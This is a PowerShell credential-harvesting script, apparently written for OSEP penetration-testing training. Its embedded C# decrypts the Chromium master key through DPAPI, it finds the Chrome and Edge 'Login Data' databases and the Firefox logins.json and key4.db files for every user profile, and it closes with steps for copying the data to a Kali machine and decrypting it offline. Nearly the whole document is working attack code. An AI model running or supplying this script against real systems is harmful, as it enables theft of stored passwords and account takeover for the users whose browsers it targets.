<#
.SYNOPSIS
    Discovery and extraction of Browser Credentials (Chrome, Edge, Firefox).
    
.DESCRIPTION
    1. Chromium (v80+): Decrypts the Master Key using DPAPI. Locates 'Login Data'.
    2. Firefox: Locates profile directories and identifies login database files.
    
    IMPORTANT: For Chromium Master Key decryption, you MUST be running 
    as the OWNER of the profile (use Token-Impersonation if SYSTEM).

.USAGE
    PS C:\> . .\Dump-BrowserCredentials.ps1
#>

$Code = @"
using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;

public class DPAPI
{
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder ppszDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct CRYPTPROTECT_PROMPTSTRUCT {
        public int cbSize;
        public int dwPromptFlags;
        public IntPtr hwndApp;
        public string szPrompt;
    }

    public static byte[] Decrypt(byte[] data)
    {
        DATA_BLOB input = new DATA_BLOB();
        DATA_BLOB output = new DATA_BLOB();
        DATA_BLOB entropy = new DATA_BLOB();
        CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();

        input.pbData = Marshal.AllocHGlobal(data.Length);
        input.cbData = data.Length;
        Marshal.Copy(data, 0, input.pbData, data.Length);

        try {
            if (CryptUnprotectData(ref input, null, ref entropy, IntPtr.Zero, ref prompt, 0, ref output))
            {
                byte[] dest = new byte[output.cbData];
                Marshal.Copy(output.pbData, dest, 0, output.cbData);
                return dest;
            }
        } catch { }
        return null;
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]"DPAPI").Type) {
    Add-Type -TypeDefinition $Code
}

function Get-ChromiumMasterKey($localStatePath) {
    if (Test-Path $localStatePath) {
        try {
            $json = Get-Content $localStatePath -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json
            if (-not $json.os_crypt.encrypted_key) { return $null }
            
            $encryptedKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $trimmedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
            $masterKey = [DPAPI]::Decrypt($trimmedKey)
            
            if ($null -ne $masterKey) {
                return [Convert]::ToBase64String($masterKey)
            }
        } catch { }
    }
    return $null
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "    Browser Credential Collector (OSEP Edition)" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

$CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "[*] Running as: $CurrentIdentity" -ForegroundColor Gray

if ($CurrentIdentity -match "SYSTEM") {
    Write-Host "[!] WARNING: You are running as SYSTEM. DPAPI decryption will fail." -ForegroundColor Red
    Write-Host "[!] Please impersonate the target user before running this script." -ForegroundColor Yellow
}

$Users = Get-ChildItem "C:\Users" -Directory

foreach ($userDir in $Users) {
    $UserName = $userDir.Name
    if ($UserName -match "Public|Default|All Users") { continue }
    
    # Check if user is the current one
    $Color = "Yellow"
    if ($CurrentIdentity -like "*$UserName") { $Color = "Green" }
    
    Write-Host "`n[*] Target User: $UserName" -ForegroundColor $Color
    
    # --- CHROMIUM (Chrome & Edge) ---
    $Browsers = @{
        "Google Chrome" = "$($userDir.FullName)\AppData\Local\Google\Chrome\User Data"
        "Microsoft Edge" = "$($userDir.FullName)\AppData\Local\Microsoft\Edge\User Data"
    }

    foreach ($bName in $Browsers.Keys) {
        $path = $Browsers[$bName]
        if (Test-Path $path) {
            Write-Host "  [+] $bName Found!" -ForegroundColor Green
            
            # 1. Decrypt Master Key
            $localState = "$path\Local State"
            $key = Get-ChromiumMasterKey $localState
            if ($key) {
                Write-Host "    [>] Master Key (B64): $key" -ForegroundColor White
            } else {
                Write-Host "    [!] Could not decrypt Master Key (Requires $UserName context)." -ForegroundColor Gray
            }

            # 2. Locate Databases
            $loginData = Get-ChildItem -Path $path -Filter "Login Data" -Recurse -ErrorAction SilentlyContinue
            foreach ($db in $loginData) {
                Write-Host "    [>] Login Database:  $($db.FullName)" -ForegroundColor Gray
            }
        }
    }

    # --- FIREFOX ---
    $ffPath = "$($userDir.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles"
    if (Test-Path $ffPath) {
        Write-Host "  [+] Firefox Profiles Found!" -ForegroundColor Green
        $profiles = Get-ChildItem $ffPath -Directory
        foreach ($p in $profiles) {
            Write-Host "    [Profile] $($p.Name)" -ForegroundColor Cyan
            $loginsJson = "$($p.FullName)\logins.json"
            $keyDB = "$($p.FullName)\key4.db"
            
            if (Test-Path $loginsJson) { Write-Host "      [>] Logins:   $loginsJson" -ForegroundColor Gray }
            if (Test-Path $keyDB)      { Write-Host "      [>] Key DB:   $keyDB" -ForegroundColor Gray }
        }
    }
}

Write-Host "`n[*] Collection Complete." -ForegroundColor Cyan

Write-Host "`n[ DECRYPTION STEPS ]" -ForegroundColor Yellow
Write-Host "1. Download the 'Login Data' file to your Kali machine." -ForegroundColor White
Write-Host "2. Run the decryption script using the Master Key found above:" -ForegroundColor White
Write-Host "   python3 decrypt_chromium.py `"YOUR_B64_MASTER_KEY`" `"/path/to/downloaded/Login Data`"" -ForegroundColor Cyan
Write-Host "`nNote: For Firefox, use 'firepwd.py' or 'SharpFirefox' with the logins.json and key4.db files." -ForegroundColor DarkGray
